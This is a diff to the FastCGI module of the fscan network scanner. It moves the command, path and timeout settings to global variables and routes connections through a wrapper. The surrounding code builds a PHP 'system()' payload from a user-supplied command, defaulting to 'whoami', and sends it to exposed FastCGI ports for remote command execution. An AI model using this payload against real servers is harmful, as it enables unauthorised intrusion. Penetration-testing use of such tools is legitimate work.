@@ -8,7 +8,6 @@ import (
 	"fmt"
 	"github.com/shadow1ng/fscan/common"
 	"io"
-	"net"
 	"strconv"
 	"strings"
 	"sync"
@@ -24,17 +23,17 @@ func FcgiScan(info *common.HostInfo) {
 		return
 	}
 	url := "/etc/issue"
-	if info.Path != "" {
-		url = info.Path
+	if common.Path != "" {
+		url = common.Path
 	}
 	addr := fmt.Sprintf("%v:%v", info.Host, info.Ports)
 	var reqParams string
 	var cutLine = "-----ASDGTasdkk361363s-----\n"
 	switch {
-	case info.Command == "read":
+	case common.Command == "read":
 		reqParams = ""
-	case info.Command != "":
-		reqParams = "<?php system('" + info.Command + "');die('" + cutLine + "');?>"
+	case common.Command != "":
+		reqParams = "<?php system('" + common.Command + "');die('" + cutLine + "');?>"
 	default:
 		reqParams = "<?php system('whoami');die('" + cutLine + "');?>"
 	}
@@ -55,7 +54,7 @@ func FcgiScan(info *common.HostInfo) {
 		env["REQUEST_METHOD"] = "GET"
 	}
 
-	fcgi, err := New(addr, info.Timeout)
+	fcgi, err := New(addr, common.Timeout)
 	defer func() {
 		if fcgi.rwc != nil {
 			fcgi.rwc.Close()
@@ -184,7 +183,7 @@ type FCGIClient struct {
 }
 
 func New(addr string, timeout int64) (fcgi *FCGIClient, err error) {
-	conn, err := net.DialTimeout("tcp", addr, time.Duration(timeout)*time.Second)
+	conn, err := common.WrapperTcpWithTimeout("tcp", addr, time.Duration(timeout)*time.Second)
 	fcgi = &FCGIClient{
 		rwc:       conn,
 		keepAlive: false,
